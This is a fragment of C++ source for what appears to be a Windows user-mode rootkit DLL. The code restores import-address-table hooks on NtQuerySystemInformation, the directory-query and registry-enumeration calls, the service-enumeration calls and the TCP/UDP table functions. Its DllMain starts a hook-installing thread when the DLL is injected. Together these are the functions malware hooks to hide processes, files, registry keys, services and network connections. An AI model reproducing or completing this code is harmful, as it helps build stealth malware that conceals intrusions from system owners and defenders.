	if (nt::lpOrgNtQuerySystemInformation != nullptr && !inlineNtqsi)
		Iat::Hook("ntdll.dll", "NtQuerySystemInformation", (LPVOID)nt::lpOrgNtQuerySystemInformation);

	if (nt::lpOrgNtQueryDirectoryFile != nullptr && !inlineNtqdf)
	{
		Iat::Hook("ntdll.dll", "NtQueryDirectoryFile", (LPVOID)nt::lpOrgNtQueryDirectoryFile);
		Iat::Hook("ntdll.dll", "NtQueryDirectoryFile", (LPVOID)nt::lpOrgNtQueryDirectoryFile, "kernel32.dll");
		Iat::Hook("ntdll.dll", "NtQueryDirectoryFile", (LPVOID)nt::lpOrgNtQueryDirectoryFile, "windows.storage.dll");
	}

	if (nt::lpOrgNtQueryDirectoryFileEx != nullptr && !inlineNtqdfex)
	{
		Iat::Hook("ntdll.dll", "NtQueryDirectoryFileEx", (LPVOID)nt::lpOrgNtQueryDirectoryFileEx);
		Iat::Hook("ntdll.dll", "NtQueryDirectoryFileEx", (LPVOID)nt::lpOrgNtQueryDirectoryFileEx, "kernel32.dll");
		Iat::Hook("ntdll.dll", "NtQueryDirectoryFileEx", (LPVOID)nt::lpOrgNtQueryDirectoryFileEx, "windows.storage.dll");
	}

	if (nt::lpOrgNtEnumerateKey != nullptr)
	{
		Iat::Hook("ntdll.dll", "NtEnumerateKey", (LPVOID)nt::lpOrgNtEnumerateKey);
		Iat::Hook("ntdll.dll", "NtEnumerateKey", (LPVOID)nt::lpOrgNtEnumerateKey, "kernelbase.dll");
	}

	if (nt::lpOrgNtEnumerateValueKey != nullptr)
	{
		Iat::Hook("ntdll.dll", "NtEnumerateValueKey", (LPVOID)nt::lpOrgNtEnumerateValueKey);
		Iat::Hook("ntdll.dll", "NtEnumerateValueKey", (LPVOID)nt::lpOrgNtEnumerateValueKey, "kernelbase.dll");
	}

	if (nt::lpOrgNtQueryKey != nullptr)
	{
		Iat::Hook("ntdll.dll", "NtQueryKey", (LPVOID)nt::lpOrgNtQueryKey);
		Iat::Hook("ntdll.dll", "NtQueryKey", (LPVOID)nt::lpOrgNtQueryKey, "kernelbase.dll");
	}

	if (nt::lpOrgEnumServiceGroupW != nullptr)
		Iat::Hook("advapi32.dll", "EnumServiceGroupW", (LPVOID)nt::lpOrgEnumServiceGroupW);

	if (nt::lpOrgEnumServicesStatusExW != nullptr)
		Iat::Hook("advapi32.dll", "EnumServicesStatusExW", (LPVOID)nt::lpOrgEnumServicesStatusExW);

	if (nt::lpOrgGetExtendedTcpTable != nullptr)
		Iat::Hook("iphlpapi.dll", "GetExtendedTcpTable", (LPVOID)nt::lpOrgGetExtendedTcpTable);

	if (nt::lpOrgGetExtendedUdpTable != nullptr)
		Iat::Hook("iphlpapi.dll", "GetExtendedUdpTable", (LPVOID)nt::lpOrgGetExtendedUdpTable);
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		DisableThreadLibraryCalls(hModule);
		if (const HANDLE hThread = CreateThread(nullptr, 0, InitHook, nullptr, 0, nullptr))
			CloseHandle(hThread);
		break;

	case DLL_PROCESS_DETACH:

		if (lpReserved == nullptr)
			Unhook();
		break;

	default:
		break;
	}

	return TRUE;
}
